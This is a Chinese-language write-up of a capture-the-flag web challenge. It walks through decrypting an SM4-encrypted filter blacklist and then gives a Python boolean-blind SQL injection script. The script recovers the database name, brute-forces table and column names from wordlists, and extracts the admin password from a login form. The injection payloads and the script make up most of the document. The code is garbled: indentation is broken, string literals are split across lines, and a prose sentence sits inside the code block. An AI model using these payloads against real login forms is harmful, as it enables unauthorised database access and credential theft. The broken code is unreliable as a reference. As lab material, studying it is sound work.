## 1z_Ssql

****

出题人：bthcls



![image-20240413222807851](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413222807851.png)

robots.txt有hint

![descript](C:/Users/26272/Pictures/media/5ac1580b858db1361623054e9f42a95b.png)

访问/here_is_a_sercet.php

![descript](C:/Users/26272/Pictures/media/f7c395f56f2be3e5d483cb88693fac77.png)

过滤的黑名单被加密了，在首页能看见加载了一个sm4.js，看得出来是一个解密脚本

![descript](C:/Users/26272/Pictures/media/9912cb05bdb5e55aa6f63b2adf1ce67a.png)

替换payload为加密的黑名单字符串，node decrypt.js运行解密脚本

![descript](C:/Users/26272/Pictures/media/38388172f2152f97c39663ae9e2d2e1e.png)

得到黑名单过滤的字符串

在登录框测试注入,输入union提示illegal words非法字符,根据过滤来绕过

![descript](C:/Users/26272/Pictures/media/d520521a77559b3bea45072c2835547d.png)

![descript](C:/Users/26272/Pictures/media/7e69a59fc06359fb03f0070112a2d392.png)

hint是假的，到这里可以判断是布尔盲注，根据过滤的字符串，数据库名和长度都可以直接跑，但是到表就 不行了，需要根据给的附件来爆破，下面是脚本

```python
import requests
import string
import time
url='http://192.168.31.60:8021'
i=0
db_name_len=0
print('[+]正在猜解数据库长度......')
while True:
	payload = "'or(length(database())<>{})#".format(i)
	params={
		"username":"{}".format(payload),
		"password":"1",
		"submit":"登录"
}
res=requests.post(url=url,data=params)
if '用户名或密码错误' in res.text:
	db_name_len=i
	print ('数据库长度为:'+str(db_name_len))
	break
if i==30:
	print('error!')
	break
i+=1
print("[+]正在猜解数据库名字......")
db_name=''
for i in range(1,db_name_len+1):
	for k in range(0,128):
		payload = "'or(ord(substr(reverse(substr(database() from {})) from {}))<>
{})#".format(i,7-i,k)
		params={
			"username":"{}".format(payload),
			"password":"1",
			"submit":"登录"
}
		res=requests.post(url=url,data=params)
		if '用户名或密码错误' in res.text:
			db_name+=chr(k)
			break
print("数据库为: %s"%db_name)
#爆破表名和字段名
print("[+]正在猜解数据表名字和字段名字......")
true_table_name=''
true_column_name=''
with open('table_name.txt','r',encoding='utf8') as f1:
	with open('cloumn_name.txt','r',encoding='utf8') as f2:
		for table_name in f1.readlines():
			table_name = table_name.strip()
			for column_name in f2.readlines():
				column_name = column_name.strip()
				payload = "'or(length((select(group_concat({}))from({}.
{})))>0)#".format(column_name,db_name,table_name)
				params={
				"username":"{}".format(payload),
				"password":"1",
				"submit":"登录"
}
				res=requests.post(url=url,data=params)
				if 'smart' in res.text:
					true_table_name = table_name
					true_column_name = column_name
					print("数据表和字段名为: {}和
{}".format(true_table_name,true_column_name))
				continue
i=0
column_len=0
print('[+]正在猜解字段长度......')
while True:
	payload = "'or(length((select(group_concat(password))from(bthcls.users)))<>
{})#".format(i)
	params={
		"username":"{}".format(payload),
		"password":"1",
		"submit":"登录"
}
	res=requests.post(url=url,data=params)
	if '用户名或密码错误' in res.text:
		column_len=i
		print ('字段长度为:'+str(column_len))
		break
	if i==30:
		print('error!')
		break
i+=1
print("[+]正在猜字段值......")
column_value=''
for i in range(1,column_len+1):
	for k in range(0,128):
	payload =
"'or(ord(substr(reverse(substr((select(group_concat(password))from(bthcls.users))fro
m({})))from({})))<>{})#".format(i,column_len+1-i,k)
	params={
		"username":"{}".format(payload),
		"password":"1",
		"submit":"登录"
}
	res=requests.post(url=url,data=params)
	if '用户名或密码错误' in res.text:
		column_value+=chr(k)
		break
得到登录密码，登录得到flag，用户名当然是admin啦
print("数据库为: %s"%column_value
```

![descript](C:/Users/26272/Pictures/media/53de9e07238ed8e2587894de6918b55f.png)

![image-20231207232346114](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20231207232346114.png)

得到登录密码，登录得到flag，用户名当然是admin啦

![descript](C:/Users/26272/Pictures/media/3726211f3f1080f1c288c45e2aad6763.png)



